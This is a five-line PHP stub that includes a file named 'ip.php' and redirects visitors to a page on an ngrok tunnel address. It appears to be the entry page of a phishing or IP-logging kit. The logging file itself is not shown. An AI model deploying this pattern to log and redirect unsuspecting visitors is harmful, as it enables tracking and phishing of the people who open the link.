<?php
include 'ip.php';
header('Location: https://971f14a3e828.ngrok.io/index2.html');
exit
?>
